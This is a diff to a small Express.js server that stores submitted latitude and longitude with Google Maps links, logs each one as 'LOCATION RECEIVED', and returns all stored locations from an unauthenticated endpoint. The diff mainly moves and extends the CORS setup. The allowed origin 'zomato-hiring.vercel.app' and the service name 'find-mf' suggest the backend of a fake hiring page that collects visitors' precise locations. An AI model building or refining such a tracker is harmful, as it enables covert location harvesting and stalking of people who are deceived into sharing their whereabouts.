@@ -2,63 +2,68 @@ const express = require("express");
 const cors = require("cors");
 const fs = require("fs");
 const path = require("path");
-
+ 
 const app = express();
-
-app.use(cors());
+ 
+// ✅ CORS must be configured BEFORE routes, not inside app.listen()
+app.use(cors({
+  origin: ['https://zomato-hiring.vercel.app', 'http://localhost:3000', 'https://find-mf.onrender.com'],
+  methods: ['GET', 'POST']
+}));
+ 
 app.use(express.json());
-
+ 
 const FILE = path.join(__dirname, "locations.json");
-
+ 
 if (!fs.existsSync(FILE)) {
   fs.writeFileSync(FILE, "[]");
 }
-
+ 
 app.post("/location", (req, res) => {
-
+ 
   const data = req.body;
-
+ 
   const mapsLink =
     `https://maps.google.com/?q=${data.latitude},${data.longitude}`;
-
+ 
   const locations =
     JSON.parse(fs.readFileSync(FILE));
-
+ 
   locations.push({
     ...data,
     maps: mapsLink,
     receivedAt: new Date().toISOString()
   });
-
+ 
   fs.writeFileSync(
     FILE,
     JSON.stringify(locations, null, 2)
   );
-
+ 
   console.log("LOCATION RECEIVED:");
   console.log(data);
-
+ 
   console.log("GOOGLE MAPS:");
   console.log(mapsLink);
-
+ 
   res.json({
     success: true,
     maps: mapsLink
   });
-
+ 
 });
-
+ 
 app.get("/locations", (req, res) => {
-
+ 
   const locations =
     JSON.parse(fs.readFileSync(FILE));
-
+ 
   res.json(locations);
-
+ 
 });
-
+ 
 app.get("/", (req, res) => {
-
+ 
   res.json({
     status: "Backend API running",
     endpoints: {
@@ -66,19 +71,12 @@ app.get("/", (req, res) => {
       get: "/locations"
     }
   });
-
+ 
 });
-
+ 
 const PORT = process.env.PORT || 3000;
-
+ 
 app.listen(PORT, () => {
-
   console.log(`Server running on port ${PORT}`);
-
-  app.use(cors({
-  origin: ['https://zomato-hiring.vercel.app', 'http://localhost:3000'],
-  methods: ['GET', 'POST']
-}));
-
 });
-
+ 
